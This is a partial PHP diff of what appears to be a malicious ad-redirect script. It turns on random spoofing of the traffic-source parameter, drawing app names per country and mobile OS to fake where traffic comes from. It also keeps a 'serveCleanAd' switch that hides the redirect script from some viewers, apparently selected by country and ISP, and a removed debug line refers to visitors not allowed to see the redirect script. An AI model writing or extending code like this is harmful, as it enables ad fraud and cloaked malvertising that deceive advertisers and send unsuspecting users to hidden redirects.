@@ -53,8 +53,12 @@
 	$blacklistedCountries 	= array();
 	$blacklistedContinents 	= array();
 
-	$sourceWeightListPerCountry = array("US" => array("xhamster" => 8, "google" => 1, "pornhub" => 1),
-								  		"MX" => array("xhamster" => 8, "google" => 1, "pornhub" => 1),
+	$sourceWeightListPerCountry = array("JP" => array("iOS" 	=> array("slither.io" => 8, "謎解き母からのメモ" => 1, "Photomath" => 1, "Magic.Piano" => 1, "スヌーピードロップス" => 1), 
+													  "Android" => array("YouCam.Makeup" => 8, "ANA" => 1, "スヌーピードロップス" => 1, "mora.WALKMAN.公式ミュージックストア～" => 1, "Music.player" => 1)
+													 ),
+								  		"MX" => array("iOS" 	=> array("Scanner.for.Me" => 8, "PicLab" => 1, "Free.Music.Mgic" => 1, "Runtastic" => 1, "Text.On.Pictures" => 1), 
+								  					  "Android" => array("El.Chavo.Kart" => 8, "Zombie.Roadkill.3D" => 1, "Ice.Cream.Maker" => 1, "Kids.Doodle" => 1, "Fishing.Hook" => 1)
+								  					 ),
 								  	   );
 
 	/* 
@@ -522,7 +526,7 @@
 
 	    foreach ($osArray as $regex => $value)
 	    { 
-	        if (preg_match($regex, $user_agent))
+	        if (preg_match($regex, $_SERVER['HTTP_USER_AGENT']))
 	        {
 	            return $value;
 	        }
@@ -552,8 +556,12 @@
 	function generateAutoRotateSourceParameter($sourceWeightList)
 	{
 		$result = "f_source=";
+		$os = detectMobileOS();
 
-		$result .= weightedRand($sourceWeightList);
+		if ($os != null)
+		{
+			$result .= weightedRand($sourceWeightList[$os]);
+		}
 
 		return $result;
 	}
@@ -637,8 +645,9 @@
 
 	// Append referrer
 	$redirectUrl = appendReferrerParameter($redirectUrl);
+
 	// Append auto generated source parameter
-	//$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);
+	$redirectUrl = appendAutoRotateSourceParameter($redirectUrl, $sourceWeightList);
 
 	$serveCleanAd = false;
 
@@ -698,7 +707,6 @@
 	if ($serveCleanAd)
 	{
 		$resultHtml = str_replace("{script}", "", $resultHtml);
-		//$resultHtml = str_replace("{onload}", " onload=\"alert('Server side: Not allowed to view redirect script.');alert('isp:$isp[isp], ip:$ip');\"", $resultHtml);
 		$resultHtml = str_replace("{onload}", "", $resultHtml);
 	}
 	else
